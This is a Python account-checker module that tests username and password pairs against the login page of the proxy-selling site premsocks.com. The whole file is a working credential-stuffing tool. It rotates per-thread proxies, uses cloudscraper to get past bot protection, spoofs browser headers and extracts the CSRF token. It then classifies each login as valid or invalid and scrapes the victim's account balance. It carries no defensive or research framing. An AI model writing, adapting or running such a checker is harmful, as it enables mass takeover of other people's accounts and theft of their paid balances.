"""
Checker for Premsocks (premsocks.com)
Fixes false positives, extracts and displays available balance.
"""
import re
import threading
from typing import Tuple
from urllib.parse import urljoin

try:
    import cloudscraper
    HAS_CLOUDSCRAPER = True
except ImportError:
    HAS_CLOUDSCRAPER = False

BASE_URL = "https://premsocks.com"
LOGIN_URL = BASE_URL + "/login"
TIMEOUT = 30

def check(username: str, password: str) -> Tuple[bool, str]:
    proxy = getattr(threading.current_thread(), 'proxy', None)

    if HAS_CLOUDSCRAPER:
        session = cloudscraper.create_scraper()
    else:
        import requests
        session = requests.Session()

    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Origin": BASE_URL,
        "Referer": LOGIN_URL,
    })

    try:
        # Step 1: GET login page to extract CSRF token
        resp = session.get(LOGIN_URL, timeout=TIMEOUT)
        if resp.status_code != 200:
            return False, f"Failed to load login page (HTTP {resp.status_code})"

        html = resp.text

        # Extract CSRF token
        token_match = re.search(r'<input[^>]*name="_token"[^>]*value="([^"]+)"', html, re.I)
        csrf_token = token_match.group(1) if token_match else ""

        # Build payload
        payload = {
            "username": username,
            "password": password,
            "_token": csrf_token,
            "ctoken": "",
            "fp_dd": "",
            "fp_dd_json": "",
            "fp": "",
        }

        # Step 2: POST credentials
        post_resp = session.post(LOGIN_URL, data=payload, allow_redirects=True, timeout=TIMEOUT)

        final_html = post_resp.text
        final_html_lower = final_html.lower()
        final_url = post_resp.url.lower()

        # --- FIRST: Check for error messages ---
        error_phrases = [
            "these credentials do not match our records",
            "invalid",
            "incorrect",
            "wrong",
            "error",
            "alert alert-danger",
            "alert-danger",
            "class=\"error\"",
        ]
        for phrase in error_phrases:
            if phrase in final_html_lower:
                error_msg = re.search(r'<div[^>]*class="[^"]*alert[^"]*"[^>]*>(.*?)</div>', final_html, re.I | re.S)
                if error_msg:
                    return False, f"Login failed: {error_msg.group(1).strip()}"
                return False, "Invalid credentials"

        # --- SECOND: Check for success indicators ---
        if "logout" in final_html_lower or 'id="user"' in final_html_lower:
            # Extract balance
            balance_match = re.search(r'<span[^>]*id="balance-text"[^>]*>(.*?)</span>', final_html, re.I)
            balance = balance_match.group(1).strip() if balance_match else "N/A"
            return True, f"Login successful. Balance: {balance}"

        if "socks-proxy" in final_url:
            # Sometimes the balance might be on the redirected page (if we allowed redirects, we get that page)
            # Try to extract balance from final_html anyway
            balance_match = re.search(r'<span[^>]*id="balance-text"[^>]*>(.*?)</span>', final_html, re.I)
            balance = balance_match.group(1).strip() if balance_match else "N/A"
            return True, f"Login successful (redirected to socks list). Balance: {balance}"

        # --- THIRD: If still on login page (has login form) ---
        if 'name="username"' in final_html_lower and 'name="password"' in final_html_lower:
            return False, "Login failed – still on login page (no error shown)"

        # --- FALLBACK ---
        return False, "Login failed – unknown response"

    except Exception as e:
        return False, f"Request error: {str(e)}"